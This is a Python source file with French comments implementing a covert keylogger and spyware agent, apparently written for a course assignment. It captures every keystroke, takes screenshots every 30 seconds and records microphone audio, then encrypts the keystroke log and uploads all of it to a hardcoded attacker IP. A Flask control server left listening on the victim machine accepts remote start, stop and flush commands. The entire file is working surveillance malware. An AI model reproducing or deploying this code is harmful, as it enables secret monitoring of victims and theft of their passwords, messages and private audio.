import pynput.keyboard
import threading
import requests
import uuid
import json
import os
import time
from flask import Flask
from cryptography.fernet import Fernet
from PIL import ImageGrab
import sounddevice as sd
from scipy.io.wavfile import write

# --- CONFIGURATION ---
ATTACKER_IP = "192.168.10.100"  # IP de l'attaquant sur le réseau interne
URL_LOGS = f"http://{ATTACKER_IP}:5000/exfiltrate"
URL_MEDIA = f"http://{ATTACKER_IP}:5000/upload_media"
# Clé symétrique pour le chiffrement AES-256
KEY = b'i90Tr_XvY8AUVqb65FHykY7LYCuX3WAouN-5eNju9EE='
cipher = Fernet(KEY)

class StealthAgent:
    def __init__(self):
        self.id = str(uuid.uuid4()) # EXIGENCE : Identifiant unique UUID
        self.log = "" # Tampon mémoire (Buffer) pour les frappes
        self.is_capturing = True # État de la capture (Pilotable)
        self.lock = threading.Lock() # Verrou pour la sécurité des threads

    def keyboard_listener(self):
        """ Capture les touches et les normalise en temps réel """
        def on_press(key):
            if not self.is_capturing: return
            with self.lock:
                try:
                    self.log += str(key.char)
                except AttributeError:
                    # Normalisation des touches spéciales
                    if key == pynput.keyboard.Key.space: self.log += " "
                    elif key == pynput.keyboard.Key.enter: self.log += "\n"
        
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def loop_transmission(self):
        """ EXIGENCE : Exfiltration JSON chiffrée avec Résilience (Retry) """
        while True:
            if self.log and self.is_capturing:
                with self.lock:
                    # EXIGENCE : Encodage JSON
                    data = json.dumps({"id": self.id, "content": self.log})
                    encrypted_data = cipher.encrypt(data.encode())
                    try:
                        # Envoi via HTTP POST
                        res = requests.post(URL_LOGS, data={'payload': encrypted_data}, timeout=5)
                        if res.status_code == 200:
                            self.log = "" # Vide le tampon seulement si l'envoi réussit
                    except:
                        pass # Échec réseau : les données restent en mémoire (Résilience)
            time.sleep(10) # Intervalle d'exfiltration

    def loop_screenshot(self):
        """ Capture d'écran continue (toutes les 30 secondes) """
        while True:
            if self.is_capturing:
                try:
                    filename = f"scr_{int(time.time())}.png"
                    ImageGrab.grab().save(filename)
                    with open(filename, "rb") as f:
                        requests.post(URL_MEDIA, data={'id': self.id, 'type': 'snap'}, files={'file': f})
                    os.remove(filename) # Suppression locale après envoi
                except: pass
            time.sleep(30)

    def loop_audio(self):
        """ Enregistrement audio continu (segments de 10 secondes) """
        while True:
            if self.is_capturing:
                try:
                    fs = 16000 # Fréquence d'échantillonnage
                    duration = 10 # Secondes
                    filename = f"mic_{int(time.time())}.wav"
                    rec = sd.rec(int(duration * fs), samplerate=fs, channels=1)
                    sd.wait(); write(filename, fs, rec)
                    with open(filename, "rb") as f:
                        requests.post(URL_MEDIA, data={'id': self.id, 'type': 'mic'}, files={'file': f})
                    os.remove(filename)
                except: pass
            else:
                time.sleep(5)

# --- CONTRÔLEUR DISTANT (API ÉCOUTANT SUR LA VICTIME) ---
agent = StealthAgent()
app = Flask(__name__)

@app.route('/status')
def get_status():
    return "ACTIVE" if agent.is_capturing else "STOPPED"

@app.route('/cmd/<cmd>')
def cmd_handler(cmd):
    """ EXIGENCE : Réception des commandes start, stop et flush """
    if cmd == "start": agent.is_capturing = True
    elif cmd == "stop": agent.is_capturing = False
    elif cmd == "flush": agent.log = ""
    return "OK"

if __name__ == "__main__":
    # Lancement des threads de capture et d'exfiltration
    threading.Thread(target=agent.keyboard_listener, daemon=True).start()
    threading.Thread(target=agent.loop_transmission, daemon=True).start()
    threading.Thread(target=agent.loop_screenshot, daemon=True).start()
    threading.Thread(target=agent.loop_audio, daemon=True).start()
    # Serveur de commande sur le port 8080
    app.run(host='0.0.0.0', port=8080)
